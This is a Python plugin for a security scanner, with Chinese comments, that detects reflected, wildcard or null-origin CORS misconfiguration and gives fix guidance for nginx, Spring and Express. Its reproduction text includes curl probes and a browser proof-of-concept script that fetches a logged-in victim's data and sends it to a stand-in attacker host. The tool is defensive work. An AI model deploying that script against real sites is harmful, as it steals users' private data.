# CORS 跨域配置检测 — Origin 反射 + Access-Control 头分析
from common.models import SEVERITY_LOW, SEVERITY_MEDIUM, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from plugins.base import PluginBase


class CorsMisconfigPlugin(PluginBase):
    """检测目标是否存在 CORS 跨域配置不当（Origin 反射型）"""

    name = "CORS 跨域配置不当"
    cve = "N/A"
    severity = SEVERITY_MEDIUM
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A05:2021"
    category = "vuln"
    description = "目标服务器 CORS 配置不当，允许任意 Origin 跨域请求，可被利用发起 CSRF 攻击窃取数据"
    fix = "将 Access-Control-Allow-Origin 限制为可信域名白名单，禁止使用 * 或反射任意 Origin"
    fix_detail = (
        "【配置加固·nginx】使用 map 白名单校验 Origin，仅放行可信域名：\n"
        "  map $http_origin $allow_origin {\n"
        '      default "";\n'
        '      "~^https://(www\\.)?trusted\\.com$" "$http_origin";\n'
        '      "~^https://app\\.trusted\\.com$" "$http_origin";\n'
        "  }\n"
        "  add_header Access-Control-Allow-Origin $allow_origin always;\n"
        '  add_header Access-Control-Allow-Credentials "true" always;\n'
        '【代码修复·Spring】使用 @CrossOrigin(origins = {"https://www.trusted.com"}) 显式白名单，禁止 origins = "*"\n'
        '【代码修复·Express】app.use(cors({ origin: ["https://www.trusted.com"], credentials: true }))\n'
        "【配置原则】禁止反射任意 Origin；Access-Control-Allow-Credentials=true 时绝不可使用 ACAO: *；\n"
        "  通配符 * 与 Allow-Credentials=true 不可同时存在（浏览器规范强制）\n"
        "【WAF 规则】检测响应头 ACAO 为 * 或与请求 Origin 完全一致且 Allow-Credentials=true 时告警/拦截\n"
        "【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 1. 构造恶意 Origin 探测是否被反射：\n"
        'curl -i -H "Origin: https://evil.example.com" "http://target/api/user"\n'
        "\n"
        "# 预期响应（漏洞存在，反射型）：\n"
        "#   HTTP/1.1 200\n"
        "#   Access-Control-Allow-Origin: https://evil.example.com\n"
        "#   Access-Control-Allow-Credentials: true   # 高危：可携带受害者 Cookie\n"
        "\n"
        "# 2. 探测通配符型 CORS（低危）：\n"
        'curl -i -H "Origin: https://evil.example.com" "http://target/api/public"\n'
        "#   Access-Control-Allow-Origin: *\n"
        "\n"
        "# 3. 预检请求（Preflight）探测可被调用的方法/头：\n"
        'curl -i -X OPTIONS -H "Origin: https://evil.example.com" \\\n'
        '  -H "Access-Control-Request-Method: PUT" \\\n'
        '  -H "Access-Control-Request-Headers: X-Custom" \\\n'
        '  "http://target/api/user"\n'
        "\n"
        "# 4. 浏览器侧利用 PoC（窃取已登录用户数据）：\n"
        "# 在 evil.example.com 部署如下 HTML，诱导受害者访问：\n"
        "#   <script>\n"
        '#   fetch("http://target/api/user", {credentials: "include"})\n'
        '#     .then(r => r.text()).then(d => fetch("https://evil.example.com/log?d=" + btoa(d)));\n'
        "#   </script>"
    )

    _TEST_ORIGIN = "https://evil.example.com"

    @classmethod
    def _reflects_attacker(cls, acao: str) -> bool:
        """ACAO 是否放行攻击者 Origin

        覆盖三类危险形态：
        1. 完整反射（ACAO == 攻击者 Origin）；
        2. 前缀/后缀白名单拼接缺陷（如 ACAO=https://evil.example.com.trusted.com）；
        3. `null`（沙箱 iframe 场景）。
        """
        if not acao:
            return False
        origin = acao.strip()
        if origin.lower() == "null":
            return True
        return cls._TEST_ORIGIN in origin

    def verify(self, target, session) -> ScanResult:
        """检测 CORS 跨域配置不当：恶意 Origin 探测（GET + OPTIONS 预检）

        @param target: 目标站点 URL
        @param session: 已配置的 HTTP 会话
        @return: STATUS_CONFIRMED（反射型/通配符 CORS）或 STATUS_SAFE
        @exception: 请求异常返回 STATUS_UNKNOWN
        """
        try:
            # 构造与本站无关的恶意 Origin：若被原样反射，说明服务端未做可信域名白名单校验
            headers = {"Origin": self._TEST_ORIGIN}
            resp = session.get(target, headers=headers)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            source = "GET"

            # 部分服务端只在 OPTIONS 预检时下发 CORS 头（GET 上不反射），需补一次预检探测
            if acao != "*" and not self._reflects_attacker(acao):
                try:
                    preflight = session.request(
                        "OPTIONS",
                        target,
                        headers={"Origin": self._TEST_ORIGIN, "Access-Control-Request-Method": "GET"},
                    )
                except Exception:
                    preflight = None
                if preflight is not None:
                    pacao = preflight.headers.get("Access-Control-Allow-Origin", "")
                    if pacao == "*" or self._reflects_attacker(pacao):
                        acao = pacao
                        acac = preflight.headers.get("Access-Control-Allow-Credentials", "")
                        source = "OPTIONS 预检"

            # 通配符 CORS（低风险：浏览器禁止 * 与 Allow-Credentials=true 同时生效，无法携带凭据读数据）
            if acao == "*":
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    # 通配符本身不构成凭据窃取风险，按低危报告，避免对公共/CDN 接口造成严重度虚高
                    severity=SEVERITY_LOW,
                    status=STATUS_CONFIRMED,
                    url=target,
                    evidence=f"{source} 响应 Access-Control-Allow-Origin=*（低风险：不可携带凭据但允许任意跨域读）",
                    fix=self.fix,
                )
            # 反射型 CORS：完整反射 / 含攻击者域名（白名单前缀后缀缺陷）/ null
            if self._reflects_attacker(acao):
                origin = acao.strip()
                if origin == self._TEST_ORIGIN:
                    detail = "Origin 完全反射"
                else:
                    detail = f"ACAO 含攻击者域名（白名单可被绕过），ACAO={origin}"
                # 高危组合：Allow-Credentials=true 时跨域请求才可携带 Cookie，进而窃取已登录用户数据
                if acac.lower() == "true":
                    detail += " + Allow-Credentials=true（高风险：可携带 Cookie）"
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=target,
                    evidence=f"{detail}（{source} 响应）, ACAO={acao}, ACAC={acac}",
                    fix=self.fix,
                )
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_SAFE,
                url=target,
                evidence=f"未反射 Origin, ACAO={acao or '(无)'}",
            )
        # 网络异常置 UNKNOWN，不把请求失败误判为 CORS 安全
        except Exception as e:
            return ScanResult(kind="error", name=self.name, status=STATUS_UNKNOWN, evidence=f"请求异常: {e}")
